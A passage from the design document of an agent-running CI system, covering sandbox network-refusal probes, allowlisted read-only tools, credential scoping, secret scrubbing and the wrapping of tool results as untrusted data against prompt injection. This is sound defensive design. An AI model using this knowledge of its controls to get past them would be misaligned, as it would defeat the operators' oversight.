- **Tests:** `test/run-job-collect.test.ts` (the tools server and mailbox
  outside the data directory, only `collect_tools` served, the call limit,
  no credential in `collect.ts`, the report, stub runs, the checks and the
  workflow secrets), `test/collect-tools.test.ts` (the client: unwrapping
  results, refusals, cut results).

## media.ts makes media outside the box, with only its own secrets

- **Rule:** a job has `media.ts` exactly when its `job.yml` has `media`.
  `media.secrets` names only secrets in `MEDIA_SECRET_ENV`
  (`src/lib/media.ts`: `ELEVENLABS_API_KEY`, `LIVETESTS_MAILBOX_USER`,
  `LIVETESTS_MAILBOX_APP_PASSWORD`), and never the gateway issuer key, the
  writer or posting secrets, a tool credential, the tailnet's OAuth client,
  `BOX_REPO_TOKEN` or `GITHUB_TOKEN`, even if one were added to that list.
  In a real run (never a revision), the runner checks the listed secrets
  are set before anything starts, then, after the tools' upstreams and
  before `collect.ts`, runs `media.ts` in its own process group with only
  `MEDIA_BASE_ENV` (`PATH`, `HOME` and a few other basics), the listed
  secrets, `FLAX_AGENTS_MEDIA_DIR` (a fresh directory, mode 0700, in
  the run directory beside the data directory, never mounted into the box)
  and, for a stage with `read_repos`, the reader app's contents-read token
  for those repositories alone as `GH_TOKEN`, and, for a stage with
  `dispatch_repos`, the writer app's actions-write token for those
  repositories alone as `FLAX_AGENTS_DISPATCH_TOKEN`, which nothing else
  the runner starts gets.
  It may reach the network; with `network: tailnet` the workflow joins
  the tailnet as `tag:ci` (an ephemeral node, the org's OAuth client in
  that step only) just before the run step and leaves it after, on every
  path. It is stopped, with everything it started, after
  `timeout_minutes`, and anything it started is stopped when it ends. Its
  `media.json` must match `schema/media.schema.json`, name only plain
  relative paths, each once, of regular files inside the media directory
  (no link, no way out through a linked directory) whose size and sha256
  match, at most 200 MB in all, with `hash` the sha256 of the sorted
  `path sha256` lines. A failure, a timeout or a refused manifest fails
  the run before `collect.ts` and the box. `collect.ts` gets the
  manifest's path in `FLAX_AGENTS_MEDIA_MANIFEST` and nothing else new.
  The report keeps `media/media.json` and, up to 50 MB in manifest order,
  the files of type `video/mp4`, `text/vtt` and `image/png`; status.json
  and summary.md record the media and what was left out. Delivery reads a
  media file only through `readMediaFile`, which checks its sha256 again.
  A stub run runs no `media.ts`; the job's `fixtures/media.json` with
  `fixtures/media/`, which `flax agents check` holds to the same rules, stands in
  when there is one. `media.setup` installs, in steps before the tailnet
  join that get no secret, the locked packages, Playwright's Chromium, the
  Notes Co CLI and JDK 21 with Maven; `chromium` needs `packages`.
  `media.sources` checks out each listed repository into
  `media-sources/<name>` with a token the reader app makes for those
  repositories alone, contents read, and keeps no credentials in the
  checkout. `media.cache` (not with parts) names a source in
  `media.sources` and plain relative paths inside its checkout (no `.`
  or `..` segment), so a restore writes only into that checkout; the
  workflow restores the cache after the checkout and saves it after a
  successful run, in steps that get no secret. Only build outputs and
  downloaded dependencies belong in it, never secrets or results.
  `media.org_read` (not with parts) gives `media.ts` a contents-read
  token the reader app makes for every repository it can see, in
  `FLAX_AGENTS_ORG_READ_TOKEN`; only the run step gets it, and the runner
  keeps it from lbx, the box and job code and scrubs it from output.
  With `media.model`, a real run first checks that the month holds the
  key's `usd_per_run` (beside the box's worst case for a job that runs a
  model; against `media.model.usd_per_month` for a job with `model:
none`) and the shared month, then issues one gateway key for the media
  stage: only that model and its `fallback`, if any; `max_budget`
  `usd_per_run` for both together (the gateway prices each call at the
  model that answered, so the dollar cap and the month's reserve hold
  whichever is dearer); expiring
  `timeout_minutes` plus 10 minutes after, 2 parallel calls and 60 a
  minute like every run key, aliased `<team>/<job>/<YYYY-MM>/<run>-media` so the ledger counts it in the
  job's month. The runner serves it on a Unix socket in a fresh private
  directory (mode 0700, `/dev/shm` on the agents pool) through the same
  forwarder the box uses: only `POST /v1/messages` and the models'
  catalog entries, the model forced unless a call names the fallback,
  `max_tokens` capped at 32,768, every
  call kept in `media-forwarder.json`, the key added on the way out.
  `media.ts` gets the socket's path in `FLAX_AGENTS_MEDIA_MODEL_SOCKET`
  and the model's id in `FLAX_AGENTS_MEDIA_MODEL` (the fallback's in
  `FLAX_AGENTS_MEDIA_MODEL_FALLBACK`), never a key. When
  `media.ts` ends, on every path, the socket stops, the key is blocked,
  its spend is read and status.json and summary.md record its alias, id,
  budget, spend and calls. `flax agents check` refuses a model that is not
  listed (or not confirmed), a fallback that is not listed (or not
  confirmed) or is the model itself, a run budget over the month's, and a key
  that would outlive the gateway's `key_max_minutes`; the monthly cap
  counts `media.model.usd_per_month`. The workflow of a job with `model:
none` gives its run step the issuer key only when it has
  `media.model`.
  With `media.parts` (only `model: none` and output kind `youtube`), each
  part runs in a workflow job of its own on the agents pool with the same
  rules: its setup and sources are the stage's plus its own, its network
  its own or the stage's, its secrets a subset of the stage's (`pnpm
check` refuses any other), the issuer key only in a part with `model:
true` (whose key lives its own `timeout_minutes` plus 10, within
  `key_max_minutes`). A part delivers nothing; what it leaves for the
  `deliver` job is its checked media directory or a `failed.json` reason
  with the run's secrets redacted. `deliver` gets only the delivery
  secrets, checks every part's files against that part's `media.json`
  again before it merges them, refuses two parts that write the same path,
  and lists every part without media in `data.failed`.
- **Where:** `src/check/media.ts`, `src/lib/media.ts`, `src/run-job/media-parts.ts`,
  `src/run-job/media.ts`, `src/run-job/media-model.ts`, called from
  `src/run-job/run.ts` and `src/run-job/no-model.ts`;
  `src/media/model-client.ts` (the client `media.ts` uses);
  `schema/media.schema.json`; the tailnet and setup steps in
  `src/generate/render.ts`; `MEDIA_EXTERNALS` in `src/bundle/build.ts`.
- **Why:** recording and screenshots need a browser, the network and
  credentials, and the model's box must have none of them. Running that
  work as job code on the runner, before the model, keeps it
  deterministic and out of the model's reach, and a fixed environment
  means a mistake in `media.ts` or a library it pulls in can leak only the
  secrets its job listed, never the keys that issue model spend, write to
  repositories or post. The manifest, checked byte for byte, is the one
  record of what the media stage made, so what collect.ts describes, what
  the report keeps and what delivery publishes are the same files. The
  tailnet is joined only for jobs that ask, and left at once, so no other
  job's runner reaches the private addresses. A recording that shows a
  coding agent needs a model, but a key in `media.ts`'s environment would
  be one more secret a library could leak; served on a socket, the key
  stays with the runner like the box's, and the gateway caps what the
  stage can spend however `media.ts` behaves.
- **Tests:** `test/media.test.ts` (the manifest rules, the hash, links and
  linked directories, the report's cap and types, a file holding a
  secret, the environment, the secret lists, the check, the workflow
  steps and secrets, the timeout stopping everything it started),
  `test/media-setup.test.ts` (the setup and sources steps, Chromium only
  with the packages, Playwright external only in a `media.mjs`),
  `test/run-job-media.test.ts` (a real run through `runJob` with the
  stand-in `lbx` and gateway: only the listed secret, the directory
  outside the data directory, `collect.ts` reading the manifest, the
  report; a failing `media.ts`, a mismatched file, a missing secret, stub
  runs with and without the fixture; a media key issued, served, blocked
  and reported, and refused when the month cannot hold it),
  `test/media-model.test.ts` (the key's alias, budget, model and expiry,
  the socket forcing the model and adding the key, the fallback on the
  same key and budget and served by name, blocking and spend, the client's
  retries, the check of the model and the fallback, and the monthly cap),
  `test/youtube-delivery.test.ts` (a job with `model: none` and a media
  key, its budget and its workflow), `test/runner-bundle.test.ts` (the
  bundled `media.ts`).

## render.ts only formats, and the message is kept

- **Rule:** after the answer is accepted, a job with `render.ts` gets the
  answer on its standard input, in its own process without the issuer key
  or any credential, and must print `{ "text", "blocks" }` within 60
  seconds and 1 MB: a fallback text of at most 2,900 characters and at most
  48 Block Kit blocks (leaving room for the footer and a shadow run's line)
  of the types `header`, `section`, `divider` and
  `context`, within Slack's text limits, with nothing interactive: a
  header has one `plain_text` text, a section one `plain_text` or
  `mrkdwn` text (no `fields`, no `accessory`), a context only text
  elements, and a text only `type`, `text`, `emoji` and `verbatim`. A
  job with `output.kind: slack` and no `render.ts` gets a plain message
  instead: one line, `*<job>*: <line>`, the line taken from the answer's
  first non-empty `headline`, `summary`, `title`, `text` or `message`
  and cut to 300 characters. The runner adds a context footer
  linking the workflow run (built from `GITHUB_SERVER_URL`,
  `GITHUB_REPOSITORY` and `GITHUB_RUN_ID`), the job and the model, and
  keeps the message as `slack.json` (the `chat.postMessage` body without a
  channel, unfurling off) and `slack.md` (a readable copy). render.ts
  posts nothing; only a slack job's delivery step does (below). A
  message that breaks these rules fails the run; the answer is still kept.
- **Where:** `src/run-job/slack-render.ts`, called from `src/run-job/run.ts`.
- **Why:** the model picks the words and code picks the look, so every
  message has the same shape. Running job code in its own process keeps the
  runner's credentials out of its reach, and checking the blocks now means a
  message that Slack would refuse fails in shadow, not on its first live
  post. The run link lets a reader go from any message to the report behind
  it.
- **Tests:** `test/slack-render.test.ts` (the block rules, the footer with
  and without a workflow run, the Markdown copy, a run with render.ts, no
  credential in render.ts, a refused message), `test/system-health-report.test.ts`,
  `test/slack-delivery.test.ts` (keys a report block may not have, the
  plain message).

## The final answer is one JSON value

- **Rule:** the runner reads the model's final message as JSON. It also
  takes the JSON out of one code fence around the whole message, out of
  the one `json` code block in prose, or from prose followed by JSON that
  starts on its own line and runs to the end. A message that starts with
  one complete JSON object or array and goes on with text holding no
  second one (a broken leftover fragment of an earlier draft, or prose) is
  read as that first value, and the rest is ignored with a warning in the
  log, `status.json` (`answerWarning`) and `summary.md` saying how many
  characters were ignored and how they start. The rest holds a second one
  when it parses on its own or a line of it starts a complete object or
  array; then, as with JSON inline in a sentence, two blocks, or prose
  before the JSON with more text after it, the answer is refused and goes
  to the repair turn. An accepted value gets every check: the output
  schema, the quote check, the PR checker, the attribution check and the
  second check. The second check's own verdict is never read past: a
  verdict with text after it is refused. Its prompt states that a reason
  holds at most 600 characters (`MAX_REASON_CHARS`); a verdict whose only
  schema problem is a longer reason is kept, with that reason clipped and
  ending ` [cut]`, rather than failing the run.
- **Where:** `parseAnswer` in `src/run-job/answer.ts`, `readAnswer` in
  `src/run-job/run.ts`, `parseVerdict` in `src/run-job/review.ts`.
- **Why:** a model sometimes ends a long answer with the tail of an earlier
  draft after the complete JSON (an 88 KB answer followed by 10 KB of a
  broken fragment). Failing that run, or asking the model to type the whole
  answer again, wastes a finished run; two complete values are a real
  choice the runner will not make for the model. A second check once
  approved a digest with a 707-character reason, and the schema error
  failed the run although the verdict was clear.
- **Tests:** `test/run-job-answer.test.ts` (a complete answer followed by a
  broken fragment or prose, two complete values, prose around the JSON),
  `test/run-job.test.ts` (the warning in the log, `status.json` and
  `summary.md`; two values fail the run), `test/review-input.test.ts`
  (the verdict, a reason clipped to its limit).

## An answer that fails its schema gets one repair turn

- **Rule:** when a run's final answer is not JSON or does not match the
  job's `output.json` (after the maintainer notes, and a revision's
  replies, come off), the runner sends it back once: a second `lbx --run`
  on the same data directory, socket directory, forwarder, tools and
  gateway key, where Pi continues the run's own session (`--session`
  with the newest session file the run left, a plain `.jsonl` name,
  never a link) and gets only `repair.md`: the exact problems, the size
  of each value over a length or count limit, and the instruction to send
  the complete corrected answer, smaller by changing less rather than cut
  off. The runner writes `repair.md` with an exclusive create, so a file
  the box left there stops the turn. The turn has what the writer left of
  the run's time limit (`limits.turns`), at most 10 minutes, and none
  when under 2 minutes are left; its model calls go through the same key,
  so they count against the same per-run budget. There is at most one
  repair turn per run. Its answer goes through every check the first
  would have (the output schema, the quote check, the PR checker, the
  untrusted-input gate, the citation check, the attribution check and the
  second check); if it fails the schema too, or the turn cannot run, the run fails as before,
  the failure saying so. The report keeps the first answer as
  `answer.txt`, and `repair/prompt.md`, `repair/argv.json`,
  `repair/answer.txt` and `repair/transcript/`; `status.json` and
  `summary.md` record the first answer's problems and the outcome
  (repaired, failed, or not run and why).
- **Where:** `src/run-job/repair.ts` (`sessionToContinue`, `sizeNotes`,
  `repairPrompt`, `repairSeconds`), the repair turn in
  `src/run-job/run.ts`, `piCommand` in `src/run-job/argv.ts` (the
  `session` option), `describeRepair` in `src/run-job/report.ts`.
- **Why:** a run that did all its work and broke one schema limit in its
  last message (a patch 3,500 characters over the 40,000 cap after 23
  minutes) is cheaper to fix with one more turn than to run again, and
  the model that wrote the answer still has everything it read in its
  session. The repaired answer gets no lighter checks than the first. The
  turn takes its time out of the run's own limit rather than adding its
  own: a run key lives for the run's limit, the second check and a
  10-minute margin, and that must stay under the gateway's 120-minute
  ceiling (`key_max_minutes`), which `atlas-doc-refresh` (100 turns, a
  pull request job) already reaches.
- **Tests:** `test/run-job.test.ts` (repaired and failed turns, an answer
  that is not JSON, at most one turn, the size notes, the time left),
  `test/run-job-argv.test.ts` (the repair command line),
  `test/run-job-sockets.test.ts` (the repair box gets both sockets, with
  the tools and the model still served),
  `test/run-job-pr.test.ts` (the PR checker and second check on the
  repaired answer), `test/agent-image.test.ts` (`--session` in the image's
  flag check).

## Maintainer notes are kept, never delivered

- **Rule:** the schema a run gives Pi (`output.schema.json` in the data
  directory) is the job's `output.json` with one more top-level property,
  `maintainer_notes`, optional: at most 5 items, each exactly a `kind`
  (`missing_data`, `missing_tool`, `unclear_prompt`, `limit_hit`) and a
  `text` of 1 to 300 characters. The preamble explains it. Once the answer
  parses as JSON, the runner takes `maintainer_notes` off it before anything
  else reads it: the job's output check, `answer.json`, `render.ts` and the
  quote check see only the rest. Notes that match go into
  `maintainer-notes.json` (with the job, run name and model) and a list in
  `summary.md`, also when the answer then fails its check; notes that do
  not match are dropped whole, with a warning in the log, `status.json` and
  `summary.md`, and never fail the run. Missing notes are no notes. In
  `summary.md` each text is one line with every Markdown and HTML character
  escaped. The generated workflow keeps `maintainer-notes.json` on its own
  as the artifact `job-<name>-maintainer-notes` for 90 days. Nothing posts
  the notes: not a Slack message, not a pull request, not `render.ts`.
- **Where:** `src/lib/maintainer-notes.ts` (the schema, `withMaintainerNotes`,
  `splitMaintainerNotes`, `plainMarkdown`), `src/run-job/run.ts`,
  `summaryMarkdown` in `src/run-job/report.ts`, `src/run-job/preamble.ts`,
  the "Keep the maintainer notes" step in `src/generate/render.ts`.
- **Why:** the model is the one that knows what data, tools or instructions
  it lacked, and a job's owner should hear it without every job adding
  fields to its answer. The notes are model text about the run, not part of
  the job's answer, so they must never change whether a run passes or what
  it delivers; they are read like any answer text (capped, scrubbed,
  escaped), since a misled model could write anything there.
- **Tests:** `test/maintainer-notes.test.ts` (splitting and dropping,
  every job's schema with the notes added compiles and takes its fixture,
  the schema Pi gets, the report, the summary, the warning, notes kept when
  the answer fails, `render.ts` never seeing them, a property test of the
  escaping), `test/folder.test.ts`, `test/generated.test.ts`,
  `test/run-job.test.ts`.

## Maintainer notes are read only from their own artifacts

- **Rule:** the `gh-maintainer-notes` tool calls `maintainer_notes_list`,
  which the tools server serves itself on the github upstream with the
  run's read-only installation token, not through github-mcp-server. It
  reads only `notes-co/agents`, one job at a time by its name,
  at most 14 days back: it lists the artifacts named exactly
  `job-<name>-maintainer-notes` (one request, 100 at most), skips expired
  ones and reads at most the newest 40. Each download follows GitHub's
  redirect only to an `https` host in `github-log-hosts.yml`, without the
  token, refuses an artifact over 256 KB, reads only the top-level
  `maintainer-notes.json` of the zip (stored or deflated, at most 64 KB,
  size and checksum checked, no encryption or ZIP64), and returns only notes
  that match the notes schema; a run whose notes cannot be read is listed
  with the reason. Errors from the GitHub API name only the status. The
  result is scrubbed, capped and wrapped as data like every tool result.
- **Where:** `src/tools-server/artifacts.ts` (`MaintainerNotesReader`,
  `readZipEntry`, `GithubUpstream`), `githubGuard` and
  `NATIVE_GITHUB_OPERATIONS` in `src/tools-server/github.ts`,
  `src/tools-server/start-upstreams.ts`, `tools/gh-maintainer-notes/`.
- **Why:** the notes live in workflow artifacts, which download from signed
  storage URLs; a narrow reader that knows the one artifact name, the one
  file in it and the notes' shape reads them without handing a signed URL,
  a whole report or an arbitrary archive to anyone. The exact host list
  keeps the runner from following a redirect anywhere else.
- **Tests:** `test/maintainer-notes.test.ts` (against a fake GitHub API:
  the window, the order, the token only on API requests, unlisted hosts,
  plain http, large and malformed artifacts, the guard, a failed list, the
  tools server serving it next to github-mcp-server; the zip reader,
  including a property test and a size that lies),
  `test/tools-catalog.test.ts`.

## Run reports are read only as digests

- **Rule:** the `gh-run-report` tool calls `run_report_read`, which the
  tools server serves itself on the github upstream with the run's
  read-only installation token, not through github-mcp-server. It reads
  only `notes-co/agents`, one run of one job at a time by the
  job's name and the workflow run id: it lists that run's artifacts named
  exactly `job-<name>-report`, refuses an expired one or one over 64 MB,
  follows the download only to an `https` host in `github-log-hosts.yml`
  without the token, and unpacks only the top-level `status.json` (at most
  1 MB) and `input.json` (at most 16 MB). It returns a digest, never the
  files: whether the run passed, its mode and input source, its pull
  request delivery (outcome, the second check's verdict, the pages changed,
  the pages left out with the check that left each out, the pull requests
  with whether each merged itself), and from the input the pages, the
  deferred pages with their reason and whether the run waited on its own
  pull request; strings are cut at 300 characters and lists at 100 items.
  No page text, answer, problem text or transcript is returned. A file
  that cannot be read is named in the digest; errors from the GitHub API
  name only the status.
- **Where:** `src/tools-server/artifacts.ts` (`RunReportReader`,
  `statusDigest`, `inputDigest`), `githubGuard` and
  `NATIVE_GITHUB_OPERATIONS` in `src/tools-server/github.ts`,
  `src/tools-server/start-upstreams.ts`, `tools/gh-run-report/`.
- **Why:** the system health report counts what the live jobs did in a
  week from their reports; a report holds transcripts and page text that
  a collection has no use for, so the reader hands over names and counts
  only.
- **Tests:** `test/run-report.test.ts` (against a fake GitHub API: the
  digest and what it leaves out, the token only on API requests, unreadable
  files, missing, expired and oversized artifacts, unlisted hosts, the
  guard, a failed list, the tools server serving it next to
  github-mcp-server), `test/tools-catalog.test.ts`.

## The box cannot reach the systems behind the tools

- **Rule:** the manual Network refusal check (`flax agents net-check`,
  `.github/workflows/net-refusal.yml`) starts the pinned box with the same
  data directory rules, lbx configuration and lbx command line builder as a
  job run, with `--no-network` after asking lbx for the flag and no socket
  directory, and runs a probe in it instead of Pi. For each Kubernetes API
  (from the kubeconfig secrets; the box gets host names and addresses,
  never a credential), `api.github.com`, `slack.com`, the OpenObserve
  query, ingest and UI hosts and `example.com`, the probe tries a DNS
  lookup, a direct DNS query, a direct connection to each address the
  runner resolved and a direct connection by name. It passes only when
  every attempt fails, every connection to an address fails with no route
  (`ENETUNREACH` or `EHOSTUNREACH`; a timeout or a refused connection
  means a route exists), the box has no address besides loopback and its
  proxy variables name no proxy, and the probe reached a listener on
  loopback. It prints PASS or FAIL per target and fails the workflow
  otherwise. lbx never gets the kubeconfigs.
- **Where:** `src/net-check/` (`probe.ts` runs in the box, bundled into
  one file of Node's own modules; `verdict.ts` decides; `targets.ts` reads
  the hosts; `run.ts` starts the box).
- **Why:** the tools are the only way to the credentials, which holds only
  if the box has no other way out. A model trying and failing proves
  nothing; a probe that tries every path, with a control showing it can
  tell success from failure, does.
- **Tests:** `test/net-check.test.ts` (the verdict: a box with no route
  passes; a proxy, an address besides loopback, a route, a reached target,
  a missing interface list or a failed loopback control fails; the targets
  without credentials; the probe's interface list and proxy variables,
  against a local listener; the whole check with a stand-in lbx that runs
  the bundled probe, and the refusal of an lbx without `--no-network`),
  `test/run-job-argv.test.ts` (`--no-network` without a socket
  directory).

## Quotes of tool results are checked

- **Rule:** after a real run of a job with tools, every object in the
  answer with a string `tool` and a string `quote` is checked: the tool is
  one the job lists, the quote is at least 6 characters besides spaces, and
  it appears, ignoring whitespace, in a result that tool returned in the
  run (for a JSON result, also in its string values without their
  escapes). The results are the text the tools server gave the model,
  kept in memory by the server. A quote not found fails the run;
  `status.json` lists each quote and why it was not found, and the summary
  counts them. Stub runs call no tools, so their quotes are not checked.
  A pull request job with `output.tool_citations: true` may cite such a
  quote as a change's evidence (`schema/patch-set-tool-quotes.schema.json`):
  the PR checker holds each one in the patch set it delivers, also one a
  `publish.ts` built, to the same rules (`quoteProblem`) and leaves out
  the page whose quote no result holds, and the second check sees the
  quote with a kit rule saying what it proves. Without the option such a
  citation fails the patch set's schema as before.
- **Where:** `src/run-job/evidence.ts`, called from `src/run-job/run.ts`
  and `src/output-check/pr.ts`; `ToolsServer.results` in
  `src/tools-server/server.ts`.
- **Why:** the preamble asks the model to cite evidence for every claim. A
  job whose answers name the tool and quote its result can be held to
  that: a quote no tool returned is a made-up citation, and the run says
  so instead of passing it on.
- **Tests:** `test/run-job-evidence.test.ts` (where citations are found,
  whitespace, JSON escapes, the wrong tool, a tool not called, a quote too
  short; a property test that any long enough piece of a result is found),
  `test/run-job-tools.test.ts` (a quote found and one not found, end to
  end), `test/pr-kit-options.test.ts` (quotes in a patch set: found, not
  found, another tool, a job without the option, a stub run).

## The tools server refuses what a job did not ask for

- **Rule:** the tools server is an MCP server that declares tools and
  nothing else. It answers only `initialize`, `ping`, `tools/list`,
  `tools/call`, `notifications/initialized` and
  `notifications/cancelled`; any other method (resources, prompts, completions, logging, sampling, elicitation,
  roots, tasks) gets "method not found" and is recorded. It lists exactly
  the tools the job names, with their `tool.yml` names, descriptions and
  argument schemas. A call is refused with a tool error, and nothing is
  sent upstream, when the tool is not one the job lists, the run has used
  `limits.tool_calls`, the arguments do not match the schema, `map.ts`
  refuses, or `map.ts` asks for an operation `tool.yml` does not list. A
  `tools/call` the MCP SDK rejects before it reaches the tools server (no
  params, a name that is not a string, arguments that are not an object) is
  recorded and counts against `limits.tool_calls` too. A call that takes
  longer than `limits.tool_seconds` is cut off, its upstream request
  aborted, and a tool error returned.
- **Where:** `src/tools-server/server.ts`, `src/tools-server/mapping.ts`.
- **Why:** the model reads untrusted input and can be misled into asking
  for anything. What it may ask for is decided by reviewed files and the
  job's limits, never by the model or by what an upstream offers.
- **Tests:** `test/tools-server.test.ts` (each refusal against a fake
  upstream that records what reaches it, each refused method),
  `test/tools-e2e.test.ts` (refusals, the call limit and a timeout through
  the tools socket and the Pi plugin).

## Tool results are capped, marked as data and recorded

- **Rule:** every result is cut to the tool's `result_max_bytes`, on a
  character boundary, and further if needed so the reply fits in one
  message after JSON escaping; the model is told when it was cut. It
  is then wrapped between two markers carrying a random tag chosen after
  the data is known, with a fixed note that the text is data, not
  instructions. Upstream error text, and the error text of a `map.ts` that
  fails, is wrapped the same way. Every call is recorded (tool, arguments,
  operation, outcome, time, result size and, for an answered call, the
  result the model got inside the markers), and the record and every
  message go into the run report (`tools.json`, and `socket/in/` and
  `socket/out/` for the model's tools, `collect/mailbox/` for those of
  `collect.ts`) through the report writer's secret scrubber. The report
  opens the mailbox of `collect.ts` again one level at a time, refusing
  links, and copies only message file names, so a swapped mailbox copies
  nothing and other names cannot push messages out.
- **Where:** `fitResult` and `wrapUntrusted` in
  `src/tools-server/server.ts`; `writeToolsReport` in
  `src/tools-server/start.ts`.
- **Why:** tool results carry text anyone can write (log lines, pull
  request bodies, Slack messages). Marking it keeps instructions inside it
  from passing as ours, the cap keeps one result from filling the model's
  context, and the record shows afterwards what the model asked and got.
- **Tests:** `test/tools-server.test.ts` (property tests: a cut never
  splits a character or passes the cap; data cannot close its own block),
  `test/tools-e2e.test.ts` (the report of each transport).

## Tools call only allowlisted read operations

- **Rule:** each upstream offers a fixed list of operations
  (`UPSTREAM_OPERATIONS` in `src/lib/tools.ts`), and `schema/tool.schema.json`
  names exactly those upstreams. Every call is checked three times: the
  tool's own `map.ts` limits and forced values (the table in
  [adding-a-tool.md](adding-a-tool.md#the-tools)), the tools server's
  check that the operation is one `tool.yml` lists, and the upstream's own
  check before anything leaves the runner. kubernetes-mcp-server runs
  read-only with the core toolset, only the six operations enabled, Secrets
  denied, one server per cluster and never the `config` toolset; a call
  names one of the four clusters. Namespaces are listed by the tools
  server with one fixed request, `GET /api/v1/namespaces`, keeping four
  fields. github-mcp-server runs `--read-only`
  with lockdown mode, and a call must be in `notes-co`, use only the
  allowed `actions_list` and `pull_request_read` methods, search pull
  requests only with the fixed query `org:notes-co is:pr is:open`
  (optionally one author) or `org:notes-co is:pr is:merged
merged:>=<day>`, list commits of `main` only and at most 50, read files
  of `main`, a release tag `vX.Y.Z` or a commit by its full sha only, list only Status items of the Engineering Board
  (project 3) by a day, board statuses or both, read issues of
  `notes-co/product` only (fixed fields, or one issue by `get`), and ask `get_job_logs` for one job's content, never its signed URL. Maintainer
  notes are read by the tools server itself, from `agents` only (see
  [Maintainer notes are read only from their own artifacts](#maintainer-notes-are-read-only-from-their-own-artifacts)), and
  so are comparisons: `compare_commits` compares two commit shas of one
  `notes-co` repository with one fixed GET, never a branch or tag. So are the code reads at a commit: `commit_grep` downloads one
  commit's tarball by its full sha (from `codeload.github.com` only,
  without the token, at most 300 MB, kept on the runner for the run) and
  runs a checked pattern over its text files in a worker thread it stops
  after 10 seconds a batch, `path_history` and `commit_blame` send one
  fixed GraphQL query each (never a mutation; only the variables come
  from the call), and `commit_tree` makes one fixed tree GET; a branch
  name is accepted only by `path_history`, and only a plain one. OpenObserve
  (v0.91.3, no MCP server) is read through its REST API, and the upstream
  builds only six read requests (stream list, stream schema, SQL search
  over logs, SQL search over traces, PromQL range query, latest traces), always in the `default`
  organization, refusing any other operation or argument; there is no write
  endpoint in the code. Slack reads only channels in the `read` list of
  `channels.yml`, at most 100 messages, at most 24 hours back. Each MCP
  server must offer every operation the tools call, or the run does not
  start; the servers' own tool descriptions are never passed on.
- **Where:** `tools/*/map.ts`, `src/tools-server/map-helpers.ts`,
  `src/tools-server/mcp-upstream.ts`, `src/tools-server/kubernetes.ts`,
  `src/tools-server/github.ts`, `src/tools-server/code-reader.ts`,
  `src/tools-server/code-grep.ts`, `src/tools-server/tar.ts`,
  `src/tools-server/openobserve.ts`, `src/tools-server/slack.ts`.
- **Why:** OpenObserve's open-source build enforces no roles, so the
  service account could write; the fixed request list is the only thing
  keeping it read-only. The other servers
  have read-only switches, but a switch is one layer, not the guarantee,
  and a signed log URL or a kubeconfig in a result would hand the model a
  credential.
- **Tests:** `test/tools-catalog.test.ts` and `test/tools-reads.test.ts` (every tool's exact upstream call,
  forced values and refusals against a recording fake),
  `test/tools-upstreams.test.ts` (each upstream against a fake: MCP
  servers over stdio, OpenObserve's REST API, the GitHub API, the Slack
  API; routing by cluster, the guards, a server missing an operation,
  OpenObserve's exact requests, refused operations and arguments sent
  nowhere, and its 401, 5xx and non-JSON answers scrubbed and wrapped), `test/gh-compare.test.ts` (the comparison's one GET, its guard,
  its size budget and its refusals), `test/code-reads.test.ts` (the tarball
  download, cache, retries and redirects, the tar reader and its limits,
  pattern checks, the worker's time limit, the GraphQL and tree reads,
  the guard), `test/tools.test.ts` (the
  schema's upstreams match `UPSTREAM_OPERATIONS`).

## Upstream credentials stay with their upstream

- **Rule:** each upstream gets only its own credential. MCP server children
  start with a minimal environment plus their credential and nothing else
  of the runner's. Kubeconfigs and the kubernetes-mcp-server config are
  written mode 0600 into a mode 0700 directory outside the data directory,
  removed when the run ends. github-mcp-server gets an installation token
  made for the run and narrowed to `actions`, `contents`, `metadata` and
  `pull_requests` read, plus `organization_projects` or `issues` read
  only when one of the job's tools calls an operation that needs it; a
  token granted anything more than it asked for is revoked and the run
  does not start, and the token is revoked when the run ends; errors
  from the GitHub API name only the status. The OpenObserve port-forward
  runs in-process on 127.0.0.1 and closes with the run. Start errors are
  scrubbed of the run's credentials.
- **Where:** `src/tools-server/start-upstreams.ts`,
  `src/tools-server/github.ts`, `src/run-job/tools.ts`,
  `src/tools-server/openobserve.ts`.
- **Why:** a child that holds another upstream's credential, or the model
  key, widens what a bug or a misled call in it can reach. The private key
  of the GitHub App never leaves the runner process. Each credential, with its
  scope, owner and revoke steps, is listed in [credentials.md](credentials.md).
- **Tests:** `test/tools-upstreams.test.ts` (each child's environment and
  files, the JWT's signature and claims, the narrowed request and the
  permissions each job asks for, revoking a wider token and at the end,
  the port-forward closing).

## Upstream text is scrubbed before the model sees it

- **Rule:** every result, and all upstream and `map.ts` error text, is
  scrubbed before it is capped and wrapped, in the reply and in the run
  record: every UUID becomes `:id` (customer org, project and report ids
  among them), and GitHub, Slack and AWS keys, JWTs (such as ServiceAccount
  tokens), OpenObserve ingestion tokens, private key blocks, credentials
  in an `Authorization` header or after `Basic` or `Bearer`, the query strings of signed URLs,
  and the run's own credential values (including the tokens inside the
  kubeconfigs, the OpenObserve password and the installation token) become
  `[redacted]`.
- **Where:** `src/tools-server/scrub.ts`, applied in
  `src/tools-server/server.ts`; `startUpstreams` builds the scrubber with
  the run's credentials.
- **Why:** results carry whatever the systems hold. Customer ids should not
  leave in a run report, and a credential in a log line or an error must
  not reach the model or the report.
- **Tests:** `test/tools-scrub.test.ts` (property tests: every UUID
  collapses, every secret shape and known value is removed wherever it
  sits, plain text is unchanged; results and errors through the tools
  server), `test/tools-upstreams.test.ts` (a kubeconfig token and a signed
  log URL from fake upstreams).

## MCP server binaries are pinned by checksum

- **Rule:** `mcp-servers.yml` validates against
  `schema/mcp-servers.schema.json`: `kubernetes-mcp-server` and
  `github-mcp-server`, each with its GitHub repository, an exact version
  (`1.2.3`, no `v`, range or tag) and, for `linux-amd64` and
  `linux-arm64`, the release asset's name and sha256 (not the all-zeros
  placeholder), plus the binary's path inside a `.tar.gz` asset and only
  there. No other keys. `flax agents fetch-servers` refuses to run from pins that
  fail this, and refuses a download whose sha256 differs before writing
  anything.
- **Where:** `schema/mcp-servers.schema.json`, `src/lib/mcp-servers.ts`,
  reported by `src/check/mcp-servers.ts`; the download in
  `src/tools-server/fetch-servers.ts`.
- **Why:** the MCP servers run next to the credentials. A checksum names
  exactly one build, so every run starts the binary that was reviewed, not
  whatever a release page serves today.
- **Tests:** `test/mcp-servers.test.ts` (versions, checksums, archives,
  unknown keys; a download that matches, one that does not, unpacking).

## GitHub log hosts are exact names

- **Rule:** `github-log-hosts.yml` validates against
  `schema/github-log-hosts.schema.json`: the day it was fetched
  (`YYYY-MM-DD`), the source `https://api.github.com/meta`, and a non-empty
  list of distinct host names in lower case with no wildcard, port, scheme,
  trailing dot or address. No other keys. `flax agents fetch-github-hosts` writes
  it: `api.github.com` plus the entries of
  `domains.actions_inbound.full_domains` that are exactly
